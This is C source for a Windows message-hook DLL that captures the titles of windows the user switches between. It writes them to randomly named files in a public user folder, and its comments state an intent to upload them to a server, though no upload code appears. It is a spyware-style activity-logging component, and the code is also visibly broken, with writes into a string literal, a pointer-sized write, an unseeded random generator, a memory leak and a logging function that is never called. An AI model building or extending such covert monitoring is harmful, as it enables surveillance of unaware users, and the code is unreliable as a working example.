#include <Windows.h>
#define PTHOOK_EXPORTS _declspec(dllexport)
#include "WinHook.h"
#include <stdio.h>
#include <time.h>

//max characters to include in title bar buffer
#define MAX_BUFFER_SIZE 200

BOOL writeToLog(LPTSTR);
VOID generateRandomStr(char holder[]);

/*Callback Function: CallWndProc 
  Get title bar caption from the Window currently activated
  and write to random named text file...upload to server in thread
*/
LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam) {
	LPTSTR szWincapText = (LPTSTR) malloc(MAX_BUFFER_SIZE);
	if (code < 0) {
		return CallNextHookEx(NULL, code, wParam, lParam);
	}
	if (code == HC_ACTION) {
		CWPSTRUCT* cwps = (CWPSTRUCT*)lParam;
		if ((cwps->message == WM_ACTIVATE) && (LOWORD(cwps->wParam) == WA_INACTIVE)) {
		OutputDebugString(L"Code==message == WM_ACTIVATE and wParam==WA_ACTIVE");
				HWND hActivatedWindow = (*cwps).hwnd; // dereference pointer and get handle to window being activated
				if (hActivatedWindow != NULL) {
					OutputDebugString(L"Window handle not null");
				}
				if (GetWindowText(hActivatedWindow, szWincapText, MAX_BUFFER_SIZE) != 0) {
					Beep(2000, 300);
					OutputDebugString(szWincapText);
				}
				return 0;
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}
/*Create random-named file and write string (caption text in parameter)*/
BOOL writeToLog(LPTSTR szWinText) {
	char* content = "";
	char generatedFileName[10];
	char dirPath[] = "C:\\Users\\Public\\tester\\";
	char filePath[38];
	generateRandomStr(generatedFileName);	
	snprintf(filePath, sizeof(filePath), "%s%s.txt", dirPath, generatedFileName);
	HANDLE fHandle = CreateFile((LPTSTR)filePath,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	//format text and write to file
	snprintf(content, MAX_BUFFER_SIZE, "window title: %s", (char*)szWinText);
	WriteFile(fHandle, content, sizeof(content),NULL,NULL);
	CloseHandle(fHandle);
	return TRUE;
}


/*Generate a log file name for the process */
VOID generateRandomStr(char holder[]) {
	//OutputDebugString((LPCWSTR)TEXT("Inside string generator...\n"));
	size_t i = 0;
	(time(NULL)); //seed random number generator using system clock seconds
	while (i < 9) {
		int x = (97 + rand() % 97);
		if (x > 96 && x < 122) {
			holder[i] = ((char)x);
			//puts((char)x);
			i++;
		}
	}
	holder[i++] = '\0'; //terminate the string
}
